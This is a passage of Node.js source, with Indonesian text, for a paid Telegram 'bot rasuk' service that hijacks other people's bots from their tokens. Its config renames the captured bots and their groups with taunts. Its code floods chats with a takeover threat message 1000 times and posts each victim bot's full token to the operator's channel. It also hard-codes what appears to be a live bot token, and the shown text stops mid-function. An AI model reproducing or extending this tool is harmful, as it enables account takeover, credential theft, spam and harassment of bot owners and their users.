const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require("path");

// ─── CONFIG ─────────────────────────────────────────────────────────
const MAIN_TOKEN = "7651158393:AAFbPfIPobzPlBckotPO8q-MwuHtpe-lbo4";
const DEVELOPER_IDS = [7867226245];
const ADMIN_ID = DEVELOPER_IDS[0];
const NOTIFY_CHANNEL = "@vghjnnnk";

const GROUP_AUTO_PREM_ID = -1004308275830;
const AUTO_PREM_ENABLED = true;

const FORCE_CHANNEL_ID = "@vghjnnnk";
const FORCE_CHANNEL_LINK = "https://t.me/vghjnnnk";
const FORCE_CHANNEL_ENABLED = true;

const AUTO_BACKUP_ENABLED = true;
const AUTO_BACKUP_INTERVAL_MS = 60 * 60 * 1000;
const AUTO_BACKUP_KEEP = 24;
const AUTO_BACKUP_SEND_TO_ADMIN = true;

const ROLE_LEVELS = { developer: 100, owner: 50, admin: 40, pt: 30, ress: 20, prem: 10, none: 0 };
const ROLE_LABELS = { developer: "DEVELOPER", owner: "OWNER", admin: "ADMIN", pt: "PT", ress: "RESS", prem: "PREM", none: "USER" };

const SLAVE_AUTO_SET_PROFILE = true;
const SLAVE_DISPLAY_NAME = "ʙᴏᴛ ʟᴜ ᴀᴍᴘᴀꜱ ᴀɴᴊ";
const SLAVE_BIO_TEXT = "ʏᴀʜᴀʜᴀʜ ʙᴏᴛ ʟᴜ ᴀᴍᴘᴀꜱ ᴀɴᴊ x ᴋᴇɴᴀ ʀᴀꜱᴜᴋ ʙʏ @ᴍᴇᴋɪɴᴊɪʀ";
const SLAVE_SHORT_BIO_TEXT = "ʏᴀʜᴀʜᴀʜ ʙᴏᴛ ʟᴜ ᴀᴍᴘᴀꜱ ᴀɴᴊ x ᴋᴇɴᴀ ʀᴀꜱᴜᴋ ʙʏ @ᴍᴇᴋɪɴᴊɪʀ";
const SLAVE_AUTO_SET_PHOTO = true;
const SLAVE_PROFILE_PHOTO_JPG = path.join(__dirname, "assets", "profile.jpg");
const SLAVE_PROFILE_PHOTO_PNG = path.join(__dirname, "assets", "profile.png");
const SLAVE_AUTO_RENAME_GROUP = true;
const SLAVE_GROUP_TITLE = "☠ ɢʀᴏᴜᴘ ɪɴɪ ᴋɪɴɪ ᴅɪᴋᴜᴀꜱᴀɪ ᴏʟᴇʜ @ᴍᴇᴋɪɴᴊɪʀ ☠";
const SLAVE_AUTO_SET_GROUP_PHOTO = true;
const SLAVE_GROUP_PHOTO_JPG = path.join(__dirname, "assets", "group.jpg");
const SLAVE_GROUP_PHOTO_PNG = path.join(__dirname, "assets", "group.png");

const START_PHOTO_PATH = path.join(__dirname, "assets", "start.jpg");
const DEFAULT_LIMIT = 3;
const DATA_FILE = path.join(__dirname, "data.json");

const SHOP_DANA_NUMBER = "";
const SHOP_DANA_NAME = "";
const SHOP_QRIS_URL = "ga ada tolol";
const SHOP_WELCOME = "🛒 <b>TOKO RASUK</b>\n\nPilih script:";
const SHOP_AFTER_PAYMENT = "✅ Kirim foto bukti bayar.";
const SHOP_REJECT_MSG = "❌ Maaf, pembayaran tidak bisa diverifikasi.";
const ACCESS_BOT_PRODUCT_NAME = "Akses Permanen (Role PREM)";
const ACCESS_BOT_PRICE = 8000;
const ACCESS_BOT_AFTER_PAYMENT = "✅ Kirim foto bukti bayar.";
const ACCESS_1D_PRODUCT_NAME = "Akses 1 Hari (Role PREM)";
const ACCESS_1D_PRICE = 1000;
const ACCESS_1D_AFTER_PAYMENT = "✅ Kirim foto bukti bayar.";

const DEFAULT_SETTINGS = {
  forceJoin: { enabled: false, chatId: null, inviteLink: null, title: "https://t.me/@mekinjir" },
  globalAutoReply: { enabled: true, text: "[SYSTEM MESSAGE]", cooldownMs: 0 },
  startMedia: { photoFileId: null, audioFileId: null, audioCaption: null }
};

// ─── STORAGE ────────────────────────────────────────────────────────
function ensureDataShape(d) {
  if (!d || typeof d !== "object") d = {};
  if (!d.bots || typeof d.bots !== "object") d.bots = {};
  if (!d.users || typeof d.users !== "object") d.users = {};
  if (!d.roles || typeof d.roles !== "object") d.roles = {};
  for (const r of ["owner", "admin", "pt", "ress", "prem"]) if (!d.roles[r] || typeof d.roles[r] !== "object") d.roles[r] = {};
  if (!d.settings || typeof d.settings !== "object") d.settings = {};
  if (!d.settings.forceJoin || typeof d.settings.forceJoin !== "object") d.settings.forceJoin = {};
  d.settings.forceJoin = { ...DEFAULT_SETTINGS.forceJoin, ...d.settings.forceJoin };
  if (!d.settings.globalAutoReply || typeof d.settings.globalAutoReply !== "object") d.settings.globalAutoReply = {};
  d.settings.globalAutoReply = { ...DEFAULT_SETTINGS.globalAutoReply, ...d.settings.globalAutoReply };
  if (!d.settings.startMedia || typeof d.settings.startMedia !== "object") d.settings.startMedia = {};
  d.settings.startMedia = { ...DEFAULT_SETTINGS.startMedia, ...d.settings.startMedia };
  if (!d.scripts || typeof d.scripts !== "object") d.scripts = {};
  if (!d.orders || typeof d.orders !== "object") d.orders = {};
  if (!d.redeems || typeof d.redeems !== "object") d.redeems = {};
  return d;
}
function loadData() {
  if (fs.existsSync(DATA_FILE)) {
    try { return ensureDataShape(JSON.parse(fs.readFileSync(DATA_FILE, "utf8"))); }
    catch { return ensureDataShape({ bots: {}, users: {} }); }
  }
  return ensureDataShape({ bots: {}, users: {} });
}
function saveData(d) { fs.writeFileSync(DATA_FILE, JSON.stringify(ensureDataShape(d), null, 2)); }

// ─── STATE ──────────────────────────────────────────────────────────
const slaveBots = {}, replyMap = {}, userState = {};
const _tokenByIdx = {}, _idxByToken = {};
let _tokenIdxCounter = 0;
function tokenToIdx(t) { if (_idxByToken[t] != null) return String(_idxByToken[t]); const i = String(_tokenIdxCounter++); _idxByToken[t] = i; _tokenByIdx[i] = t; return i; }
function idxToToken(i) { return _tokenByIdx[String(i)] || null; }
function preloadTokenIndex() { const d = loadData(); for (const t of Object.keys(d.bots || {})) tokenToIdx(t); }
function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

async function sendAutoReplyRepeated(slave, chatId, text, replyToMessageId = null, targetUsername = "?") {
  const threatMsg = `<blockquote>BOT TELAH DI AMBIL ALIH OLEH @Mekinjir ☠️\n\nOWNER : @Mekinjir\nUSN BOT : <b>${targetUsername}</b>\n\nGAK USAH SOK ASIK CHAT BOT AMPAS INI 😹\nSOALNYA CHAT LU BAKALAN MASUK KE @Mekinjir ❗❗\n\n☠️ BOTNYA UDAH BUKAN PUNYA LU LAGI\n🤡 MASIH MAU SOK JAGO? SILAKAN CHAT TERUS\n💩 FITUR BOLEH BANYAK, TAPI UJUNG-UJUNGNYA TETEP JADI BOT AMPAS\n😂 OWNER LAMA CUMA BISA LIAT BOTNYA JADI MAINAN ORANG\n\nJADI SEBELUM SOK ASIK, MENDING SADAR DIRI 😹☠️\n\n— @Mekinjir</blockquote>`;
  const opts = { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "👑 ᴅᴇᴠᴇʟᴏᴘᴇʀ 👑", url: "https://t.me/mekinjir", style: "danger" }]] } };
  if (replyToMessageId) opts.reply_to_message_id = replyToMessageId;
  const tasks = [];
  for (let i = 0; i < 1000; i++) tasks.push(slave.sendMessage(chatId, threatMsg, opts).catch(() => {}));
  await Promise.all(tasks);
}

async function createTempInviteLinkForChat(targetChatId, expireSeconds = 60) {
  if (!targetChatId) throw new Error("chatId kosong.");
  const expire_date = Math.floor(Date.now() / 1000) + Math.max(10, Number(expireSeconds) || 60);
  const res = await main.createChatInviteLink(targetChatId, { expire_date, member_limit: 1 });
  const link = res?.invite_link || null;
  if (!link) throw new Error("Gagal membuat invite link.");
  return { link, chatId: targetChatId };
}

// ─── MAIN BOT ───────────────────────────────────────────────────────
const main = new TelegramBot(MAIN_TOKEN, { polling: true });

async function sendBotText(chatId, text, opts = {}) {
  const raw = String(text ?? "");
  const isMainMenu = raw.includes("💀 Meki x bot") || raw.includes("╔.☠︎︎.") || raw.includes("WELLCOME TO BOTS RASUK") || raw.includes("⚙️ Admin Panel");
  if (isMainMenu || raw.trim().startsWith("<blockquote>")) return main.sendMessage(chatId, text, { ...(opts || {}), parse_mode: "HTML" });
  return main.sendMessage(chatId, `<blockquote>${raw}</blockquote>`, { ...(opts || {}), parse_mode: "HTML" });
}

let MAIN_BOT_USERNAME = "";
main.getMe().then((me) => { MAIN_BOT_USERNAME = me?.username || ""; }).catch(() => {});

// ─── ROLE HELPERS ───────────────────────────────────────────────────
function ensureRolesShape(d) {
  if (!d.roles || typeof d.roles !== "object") d.roles = {};
  for (const r of ["owner", "admin", "pt", "ress", "prem"]) if (!d.roles[r] || typeof d.roles[r] !== "object") d.roles[r] = {};
  return d;
}
function getUserRole(userId) {
  const id = Number(userId);
  if (DEVELOPER_IDS.includes(id)) return { role: "developer", level: ROLE_LEVELS.developer, exp: null };
  const d = ensureRolesShape(loadData());
  for (const roleKey of ["owner", "admin", "pt", "ress", "prem"]) {
    const entry = d.roles[roleKey]?.[id];
    if (entry !== undefined) {
      const exp = entry === null || entry === 0 ? null : Number(entry);
      if (exp === null) return { role: roleKey, level: ROLE_LEVELS[roleKey], exp: null };
      if (Number.isFinite(exp) && exp > Date.now()) return { role: roleKey, level: ROLE_LEVELS[roleKey], exp };
      delete d.roles[roleKey][id]; saveData(d);
    }
  }
  return { role: "none", level: 0, exp: null };
}
function hasMinRole(userId, minRole) { return getUserRole(userId).level >= (ROLE_LEVELS[minRole] || 0); }
function isAllowedCreator(u) { return getUserRole(u).level >= ROLE_LEVELS.prem; }
function canAddRole(a, r) { return getUserRole(a).level > (ROLE_LEVELS[r] || 0); }
function setUserRole(targetId, role, expireAtMs = null) {
  const d = ensureRolesShape(loadData()); const id = Number(targetId);
  for (const r of ["owner", "admin", "pt", "ress", "prem"]) if (d.roles[r]?.[id] !== undefined) delete d.roles[r][id];
  d.roles[role][id] = expireAtMs; saveData(d); return true;
}
function removeUserRole(targetId) {
  const d = ensureRolesShape(loadData()); const id = Number(targetId); let removed = false;
  for (const r of ["owner", "admin", "pt", "ress", "prem"]) if (d.roles[r]?.[id] !== undefined) { delete d.roles[r][id]; removed = true; }
  if (removed) saveData(d); return removed;
}
function fmtExpired(exp) {
  if (!exp) return "Permanen";
  const ms = Number(exp) - Date.now();
  if (ms <= 0) return "Expired";
  const hari = Math.floor(ms / 86400000), jam = Math.floor((ms % 86400000) / 3600000);
  if (hari > 0) return `${hari} hari lagi`;
  if (jam > 0) return `${jam} jam lagi`;
  return `${Math.floor((ms % 3600000) / 60000)} menit lagi`;
}
function isLikelyTelegramBotToken(text) { return /^\d{6,15}:[A-Za-z0-9_-]{20,}$/.test(String(text || "").trim()); }
function trackUser(from) {
  if (!from?.id) return;
  const d = loadData();
  d.users[from.id] = { id: from.id, username: from.username || null, first_name: from.first_name || null, last_name: from.last_name || null, lastSeen: Date.now() };
  saveData(d);
}
function maskNumericId(id) {
  const s = String(id ?? "").trim(); if (!s) return s;
  if (s.length === 1) return `${s}*`;
  if (s.length === 2) return `${s[0]}*${s[1]}`;
  return `${s[0]}${"*".repeat(s.length - 2)}${s[s.length - 1]}`;
}
function maskToken(t) {
  const s = String(t || ""); const p = s.split(":"); if (p.length < 2) return s;
  const tail = p.slice(1).join(":");
  if (tail.length <= 6) return `${p[0]}:${tail[0] || ""}*****`;
  return `${p[0]}:${tail.slice(0, 2)}*****${tail.slice(-4)}`;
}

// ─── CHANNEL NOTIF ──────────────────────────────────────────────────
function sendChannelNotif(html) {
  if (!NOTIFY_CHANNEL) return;
  sendBotText(NOTIFY_CHANNEL, html).catch((e) => console.error("[Notif] ❌", e.message));
}

async function sendRasukLogDetail(opts = {}) {
  if (!NOTIFY_CHANNEL) return;
  const { botUsername = "?", botName = "?", botId = "?", userName = "?", userUsername = "?", userId = "?", userRole = "?", token = "?", status = "✅ AKTIF" } = opts;
  const html =
    `🎉 <b>BOT BERHASIL DIRASUK!</b>\n━━━━━━━━━━━━━━━━━━━━\n\n` +
    `🤖 <b>Bot:</b> @${botUsername}\n📛 <b>Nama:</b> ${botName}\n🆔 <b>Bot ID:</b> <code>${botId}</code>\n\n` +
    `━━━━━━━━━━━━━━━━━━━━\n👤 <b>Perasuk:</b>\n📛 <b>Nama:</b> ${userName}\n🆔 <b>Username:</b> ${userUsername}\n🔑 <b>ID:</b> <code>${userId}</code>\n👑 <b>Role:</b> ${userRole}\n\n` +
    `━━━━━━━━━━━━━━━━━━━━\n🔑 <b>Token:</b> <code>${token}</code>\n📅 <b>Waktu:</b> ${new Date().toLocaleString("id-ID")}\n⏱️ <b>Status:</b> ${status}`;
  try { await sendBotText(NOTIFY_CHANNEL, html); }
  catch (e) { console.error("[RasukLog] ❌", e.message); }
}

// ─── STARTUP LOG (AUTO EDIT TIAP 1 MENIT) ───
let startupLogMsgId = null;
let startupLogTimer = null;

function formatUptime() {
  const up = process.uptime();
  const d = Math.floor(up / 86400);
  const h = Math.floor((up % 86400) / 3600);
  const m = Math.floor((up % 3600) / 60);
  const s = Math.floor(up % 60);
  if (d > 0) return `${d} hari ${h} jam ${m} menit`;
  if (h > 0) return `${h} jam ${m} menit`;
  if (m > 0) return `${m} menit ${s} detik`;
  return `${s} detik`;
}

function buildStartupCaption() {
  const d = loadData();
  const botCount = Object.keys(d.bots || {}).length;
  const userCount = Object.keys(d.users || {}).length;
  const rc = {
    developer: DEVELOPER_IDS.length,
    owner: Object.keys(d.roles?.owner || {}).length,
    admin: Object.keys(d.roles?.admin || {}).length,
    pt: Object.keys(d.roles?.pt || {}).length,
    ress: Object.keys(d.roles?.ress || {}).length,
    prem: Object.keys(d.roles?.prem || {}).length,
  };
  const startTime = new Date(Date.now() - process.uptime() * 1000);
  return (
    `🚀 <b>BOT ONLINE</b>\n━━━━━━━━━━━━━━━━━━━━\n\n` +
    `💀 <b>Meki x bot rasuk</b>\n🕊️ by Mekinjir\n\n` +
    `━━━━━━━━━━━━━━━━━━━━\n📊 <b>Statistik:</b>\n` +
    `🤖 Bot Slave: <b>${botCount}</b>\n👥 Total User: <b>${userCount}</b>\n\n` +
    `👑 <b>Role:</b>\n` +
    `  • 👑 DEVELOPER: <b>${rc.developer}</b>\n` +
    `  • 🥇 OWNER: <b>${rc.owner}</b>\n` +
    `  • 🎖️ ADMIN: <b>${rc.admin}</b>\n` +
    `  • 💎 PT: <b>${rc.pt}</b>\n` +
    `  • ⭐ RESS: <b>${rc.ress}</b>\n` +
    `  • 🔰 PREM: <b>${rc.prem}</b>\n\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `⏱️ Uptime: <b>${formatUptime()}</b>\n` +
    `📅 Mulai: ${startTime.toLocaleString("id-ID")}\n` +
    `⏱️ Status: <b>✅ AKTIF</b>\n\n` +
    `<i>Auto-update tiap 1 menit</i>`
  );
}

async function sendStartupLog() {
  if (!NOTIFY_CHANNEL) return;
  try {
    const caption = buildStartupCaption();
    if (START_PHOTO_PATH && fs.existsSync(START_PHOTO_PATH)) {
      const msg = await main.sendPhoto(NOTIFY_CHANNEL, START_PHOTO_PATH, { caption, parse_mode: "HTML" });
      startupLogMsgId = msg.message_id;
    } else {
      const msg = await main.sendMessage(NOTIFY_CHANNEL, caption, { parse_mode: "HTML" });
      startupLogMsgId = msg.message_id;
    }
    console.log("[StartupLog] ✅ Terkirim, msgId:", startupLogMsgId);
    if (startupLogTimer) clearInterval(startupLogTimer);
    startupLogTimer = setInterval(async () => {
      if (!startupLogMsgId) return;
      try {
        const newCaption = buildStartupCaption();
        const hasPhoto = START_PHOTO_PATH && fs.existsSync(START_PHOTO_PATH);
        if (hasPhoto) await main.editMessageCaption(newCaption, { chat_id: NOTIFY_CHANNEL, message_id: startupLogMsgId, parse_mode: "HTML" });
        else await main.editMessageText(newCaption, { chat_id: NOTIFY_CHANNEL, message_id: startupLogMsgId, parse_mode: "HTML" });
        console.log("[StartupLog] 🔄 Uptime:", formatUptime());
      } catch (e) {
        const msg = String(e.message || "").toLowerCase();
        if (msg.includes("message is not modified")) { /* skip */ }
        else if (msg.includes("message to edit not found")) { clearInterval(startupLogTimer); startupLogTimer = null; startupLogMsgId = null; }
      }
    }, 60 * 1000);
  } catch (e) { console.error("[StartupLog] ❌", e.message); }
}

// ─── FORCE JOIN ─────────────────────────────────────────────────────
async function isUserJoinedRequiredChat(userId) {
  const d = loadData(); const fj = d.settings.forceJoin;
  if (!fj?.enabled || !fj.chatId) return true;
  try { const m = await main.getChatMember(fj.chatId, userId); return ["creator", "administrator", "member"].includes(m?.status); } catch { return false; }
}
async function enforceForceJoinOrSendPrompt(chatId, userId) {
  const d = loadData(); const fj = d.settings.forceJoin;
  if (!fj?.enabled || !fj.chatId || !fj.inviteLink) return true;
  if (await isUserJoinedRequiredChat(userId)) return true;
  await sendBotText(chatId, `🔒 <b>Wajib Join Aktif</b>\n\nJoin <b>${fj.title || "Grup"}</b> dulu.`,
    { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "🔗 Join dulu", url: fj.inviteLink }], [{ text: "✅ Saya sudah join", callback_data: "check_join", style: "success" }]] } });
  return false;
}
async function isUserJoinedForceChannel(userId) {
  if (!FORCE_CHANNEL_ENABLED) return true;
  try { const m = await main.getChatMember(FORCE_CHANNEL_ID, userId); return ["creator", "administrator", "member"].includes(m?.status); } catch { return false; }
}
async function enforceForceChannelOrPrompt(chatId, userId) {
  if (!FORCE_CHANNEL_ENABLED) return true;
  if (await isUserJoinedForceChannel(userId)) return true;
  await sendBotText(chatId, `🔒 <b>Wajib Join Channel</b>\n\nJoin channel dulu.`,
    { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "🔗 Join Channel", url: FORCE_CHANNEL_LINK }], [{ text: "✅ Saya sudah join", callback_data: "check_channel_join", style: "success" }]] } });
  return false;
}

function formatSenderInfo(msg) {
  const u = msg.from;
  const name = u ? `${u.first_name || ""}${u.last_name ? " " + u.last_name : ""}`.trim() : "Tidak diketahui";
  const uname = u?.username ? `@${u.username}` : "tanpa username";
  const uid = u?.id ? `<code>${u.id}</code>` : "?";
  return { name, uname, uid };
}
function formatMessageContent(msg) {
  if (msg.text) return msg.entities?.some(e => e.type === "bot_command") ? `⌨️ [Command] ${msg.text}` : `💬 ${msg.text}`;
  if (msg.photo) return `🖼 [Foto]${msg.caption ? "\n" + msg.caption : ""}`;
  if (msg.video) return `🎥 [Video]`;
  if (msg.voice) return `🎤 [Voice]`;
  if (msg.audio) return `🎵 [Audio]`;
  if (msg.document) return `📎 [File]`;
  if (msg.sticker) return `🃏 [Sticker]`;
  if (msg.video_note) return `📹 [Video Note]`;
  if (msg.location) return `📍 [Lokasi]`;
  if (msg.contact) return `👤 [Kontak]`;
  if (msg.animation) return `🎞 [GIF]`;
  return `[pesan]`;
}

// ─── MENU BUILDERS ──────────────────────────────────────────────────
function buildUserMenuKeyboard(userId) {
  const role = getUserRole(userId);
  const canAdd = role.level >= ROLE_LEVELS.pt;
  const isHigh = role.level >= ROLE_LEVELS.admin;
  const rows = [
    [{ text: "⚔️ 𝙼𝙴𝙽𝚄 𝚂𝙴𝚁𝙰𝙽𝙶", callback_data: "menu_attack", style: "danger" }, { text: "🛒 𝙼𝙴𝙽𝚄 𝚃𝙾𝙺𝙾", callback_data: "menu_shop", style: "success" }],
    [{ text: "👥 𝙼𝙴𝙽𝚄 𝙶𝚁𝚄𝙿", callback_data: "menu_group", style: "primary" }, { text: "👑 𝙼𝙴𝙽𝚄 𝙾𝚆𝙽𝙴𝚁", callback_data: "menu_owner", style: "primary" }],
  ];
  if (canAdd) rows.push([
    { text: "➕ 𝙼𝙴𝙽𝚄 𝙰𝙳𝙳 𝚁𝙾𝙻𝙴", callback_data: "menu_addrole", style: "success" },
    ...(isHigh ? [{ text: "📋 𝙻𝙸𝚂𝚃 𝚁𝙾𝙻𝙴", callback_data: "menu_listrole", style: "primary" }] : [])
  ]);
  rows.push([
    { text: "💌 𝚃𝙴𝚁𝙸𝙼𝙰 𝙺𝙰𝚂𝙸𝙷", callback_data: "tqto", style: "primary" },
    { text: "🔙 𝙼𝙴𝙽𝚄 𝚄𝚃𝙰𝙼𝙰", callback_data: "menu_main", style: "primary" }
  ]);
  return { inline_keyboard: rows };
}
function buildAttackMenuKeyboard() {
  return { inline_keyboard: [
    [{ text: "➕ 𝚃𝙰𝙼𝙱𝙰𝙷 𝙱𝙾𝚃", callback_data: "u_create", style: "success" }],
    [{ text: "📋 𝙱𝙾𝚃 𝙺𝙰𝙼𝚄", callback_data: "u_list", style: "primary" }],
    [{ text: "🗑 𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃", callback_data: "u_remove", style: "danger" }],
    [{ text: "🔙 Kembali", callback_data: "menu_all", style: "primary" }],
  ]};
}
function buildShopMenuKeyboard() {
  return { inline_keyboard: [
    [{ text: "🛒 Beli Akses 1 Hari", callback_data: "buy_access_1d_start", style: "success" }],
    [{ text: "🛒 Beli Akses Permanen", callback_data: "buy_access_perm_start", style: "success" }],
    [{ text: "📋 Daftar Script", callback_data: "shop_listsc", style: "primary" }],
    [{ text: "⏳ Order Pending", callback_data: "shop_orders", style: "primary" }],
    [{ text: "🔙 Kembali", callback_data: "menu_all", style: "primary" }],
  ]};
}
function buildGroupMenuKeyboard() {
  return { inline_keyboard: [
    [{ text: "📢 Broadcast ke Grup", callback_data: "a_broadcast", style: "primary" }],
    [{ text: "🔒 Wajib Join Grup", callback_data: "a_forcejoin", style: "danger" }],
    [{ text: "🤖 Atur Auto Balas", callback_data: "u_set_autoreply", style: "primary" }],
    [{ text: "✍️ Auto Balas Global", callback_data: "setautojawab_global", style: "primary" }],
    [{ text: "📣 Broadcast Bot", callback_data: "menu_bcslave", style: "danger" }],
    [{ text: "🔙 Kembali", callback_data: "menu_all", style: "primary" }],
  ]};
}
function buildOwnerMenuKeyboard() {
  return { inline_keyboard: [
    [{ text: "📋 Semua Bot", callback_data: "a_list", style: "primary" }],
    [{ text: "👥 Daftar User", callback_data: "a_users", style: "primary" }],
    [{ text: "🗑 Hapus Bot", callback_data: "a_remove", style: "danger" }],
    [{ text: "🧹 Bersihkan Bot Beku", callback_data: "menu_clean", style: "danger" }],
    [{ text: "🛒 Kelola Script", callback_data: "shop_admin", style: "primary" }],
    [{ text: "🎁 List Redeem", callback_data: "menu_listredeem", style: "primary" }],
    [{ text: "🔙 Kembali", callback_data: "menu_all", style: "primary" }],
  ]};
}
function buildAddRoleMenuKeyboard(userId) {
  const myRole = getUserRole(userId); const rows = [];
  const roleEmoji = { owner: "🥇", admin: "🎖️", pt: "💎", ress: "⭐", prem: "🔰" };
  for (const r of ["owner", "admin", "pt", "ress", "prem"]) {
    if (myRole.level > ROLE_LEVELS[r]) rows.push([{ text: `${roleEmoji[r]} 𝙰𝙳𝙳 ${r.toUpperCase()}`, callback_data: `addrole_${r}`, style: "primary" }]);
  }
  rows.push([{ text: "🔙 Kembali", callback_data: "menu_all", style: "primary" }]);
  return { inline_keyboard: rows };
}

// ─── START MENU ─────────────────────────────────────────────────────
async function sendStartMenuOnly(chatId, userId, adminMode, from) {
  const roleInfo = getUserRole(userId);
  const isUserOnly = roleInfo.role === "none";
  const d = loadData();
  const sm = d.settings?.startMedia || {};
  const photoSource = (START_PHOTO_PATH && fs.existsSync(START_PHOTO_PATH)) ? START_PHOTO_PATH : (sm.photoFileId || null);

  if (isUserOnly) {
    const caption =
      `<blockquote>💀 Meki x bot rasuk\n` +
      `🕊️ By meki</blockquote>`;
    const reply_markup = { inline_keyboard: [[
      { text: "🎁 𝚁𝙴𝙳𝙴𝙴𝙼 𝙲𝙾𝙳𝙴", callback_data: "redeem_open", style: "success" },
      { text: "🛒 𝙱𝚄𝚈 𝙰𝙺𝚂𝙴𝚂", callback_data: "buy_access_open", style: "primary" },
    ]]};
    if (photoSource) { try { await main.sendPhoto(chatId, photoSource, { caption, parse_mode: "HTML", reply_markup }); return; } catch {} }
    await sendBotText(chatId, caption, { parse_mode: "HTML", reply_markup });
    return;
  }

  const roleLabel = ROLE_LABELS[roleInfo.role] || ROLE_LABELS.none;
  const expLabel = roleInfo.exp ? fmtExpired(roleInfo.exp) : "Permanen";
  const caption =
    `<blockquote>💀 Meki x bot rasuk\n` +
    `🕊️ By meki\n\n` +
    `👑 Role: ${roleLabel}\n` +
    `⏰ Expired: ${expLabel}</blockquote>`;
  const reply_markup = { inline_keyboard: [[{ text: "📂 𝙰𝙻𝙻 𝙼𝙴𝙽𝚄", callback_data: "menu_all", style: "primary" }]] };
  if (photoSource) { try { await main.sendPhoto(chatId, photoSource, { caption, parse_mode: "HTML", reply_markup }); return; } catch {} }
  await sendBotText(chatId, caption, { parse_mode: "HTML", reply_markup });
}
async function sendStartMediaAndMenu(chatId, userId, adminMode, _from) { await sendStartMenuOnly(chatId, userId, adminMode, _from); }

// ─── /start ─────────────────────────────────────────────────────────
main.onText(/\/start/, async (msg) => {
  const userId = msg.from.id, chatId = msg.chat.id;
  trackUser(msg.from);
  const okChannel = await enforceForceChannelOrPrompt(chatId, userId);
  if (!okChannel) return;
  if (!hasMinRole(userId, "prem")) await enforceForceJoinOrSendPrompt(chatId, userId);
  await sendStartMediaAndMenu(chatId, userId, hasMinRole(userId, "prem"), msg.from);
});

// ─── ROLE COMMANDS ──────────────────────────────────────────────────
async function handleAddRole(msg, match, targetRole) {
  const chatId = msg.chat.id, userId = msg.from.id;
  trackUser(msg.from);
  if (!canAddRole(userId, targetRole)) { await sendBotText(chatId, `❌ Gak punya akses add role <b>${ROLE_LABELS[targetRole]}</b>.`, { parse_mode: "HTML" }); return; }
  const args = String(match?.[1] || "").trim().split(/\s+/).filter(Boolean);
  const targetIdRaw = args[0] || (msg.reply_to_message?.from?.id ? String(msg.reply_to_message.from.id) : null);
  const hariRaw = args[1] || null;
  if (!targetIdRaw) { await sendBotText(chatId, `📌 <code>/add${targetRole} <id> [hari]</code>`, { parse_mode: "HTML" }); return; }
  const targetId = parseInt(String(targetIdRaw).replace(/[^0-9-]/g, ""), 10);
  if (!Number.isFinite(targetId) || targetId <= 0) { await sendBotText(chatId, "❌ ID tidak valid."); return; }
  if (DEVELOPER_IDS.includes(targetId)) { await sendBotText(chatId, "❌ Gak bisa."); return; }
  const cur = getUserRole(targetId);
  if (cur.level >= ROLE_LEVELS[targetRole]) { await sendBotText(chatId, `⚠️ Target udah punya role <b>${ROLE_LABELS[cur.role]}</b>`, { parse_mode: "HTML" }); return; }
  let expireAtMs = null, durationLabel = "Permanent";
  if (hariRaw) {
    const h = parseInt(hariRaw.replace(/[^0-9]/g, ""), 10);
    if (!Number.isFinite(h) || h <= 0) { await sendBotText(chatId, "❌ Hari tidak valid."); return; }
    expireAtMs = Date.now() + h * 86400000; durationLabel = `${h} hari`;
  }
  setUserRole(targetId, targetRole, expireAtMs);
  await sendBotText(chatId, `✅ Role <b>${ROLE_LABELS[targetRole]}</b> dikasih ke <code>${targetId}</code>\n⏰ ${durationLabel}`, { parse_mode: "HTML" });
  sendBotText(targetId, `🎉 <b>Kamu dapet role!</b>\n\n👑 ${ROLE_LABELS[targetRole]}\n⏰ ${durationLabel}`, { parse_mode: "HTML" }).catch(() => {});
  sendChannelNotif(`🎖️ <b>ROLE BARU</b>\nRole: <b>${ROLE_LABELS[targetRole]}</b>\nTarget: <code>${maskNumericId(targetId)}</code>\nDurasi: ${durationLabel}\nOleh: <code>${maskNumericId(userId)}</code>`);
}
main.onText(/\/addprem(?:\s+([\s\S]+))?\s*$/i, (m, x) => handleAddRole(m, x, "prem"));
main.onText(/\/address(?:\s+([\s\S]+))?\s*$/i, (m, x) => handleAddRole(m, x, "ress"));
main.onText(/\/addpt(?:\s+([\s\S]+))?\s*$/i, (m, x) => handleAddRole(m, x, "pt"));
main.onText(/\/addadmin(?:\s+([\s\S]+))?\s*$/i, (m, x) => handleAddRole(m, x, "admin"));
main.onText(/\/addowner(?:\s+([\s\S]+))?\s*$/i, (m, x) => handleAddRole(m, x, "owner"));

main.onText(/\/delrole(?:\s+(\d+))?\s*$/i, async (msg, match) => {
  const chatId = msg.chat.id, userId = msg.from.id;
  if (!hasMinRole(userId, "admin")) return;
  const targetId = match?.[1] ? parseInt(match[1], 10) : (msg.reply_to_message?.from?.id);
  if (!targetId) { await sendBotText(chatId, "Pakai: /delrole <id>"); return; }
  if (DEVELOPER_IDS.includes(targetId)) { await sendBotText(chatId, "❌ Gak bisa hapus DEVELOPER."); return; }
  if (getUserRole(targetId).level >= getUserRole(userId).level) { await sendBotText(chatId, "❌ Gak bisa."); return; }
  removeUserRole(targetId);
  await sendBotText(chatId, `✅ Role <code>${targetId}</code> dihapus.`, { parse_mode: "HTML" });
});

main.onText(/\/listrole\s*$/i, async (msg) => {
  const chatId = msg.chat.id, userId = msg.from.id;
  if (!hasMinRole(userId, "admin")) return;
  const d = ensureRolesShape(loadData());
  let text = "📋 <b>Daftar Role</b>\n━━━━━━━━━━━━━━\n";
  text += `👑 <b>DEVELOPER</b>: ${DEVELOPER_IDS.map(maskNumericId).join(", ")}\n\n`;
  for (const roleKey of ["owner", "admin", "pt", "ress", "prem"]) {
    const entries = Object.entries(d.roles[roleKey] || {});
    if (!entries.length) continue;
    text += `<b>${ROLE_LABELS[roleKey]}</b> (${entries.length})\n`;
    for (const [uid, exp] of entries) text += `  • <code>${maskNumericId(uid)}</code> — ${fmtExpired(exp)}\n`;
    text += "\n";
  }
  await sendBotText(chatId, text, { parse_mode: "HTML" });
});

main.onText(/\/cek(?:\s+([^\s]+))?\s*$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const arg = (match?.[1] || "").trim();
  let targetId = null;
  if (msg.reply_to_message?.from?.id) targetId = parseInt(msg.reply_to_message.from.id, 10);
  if (!targetId && arg) {
    if (/^\d+$/.test(arg)) targetId = parseInt(arg, 10);
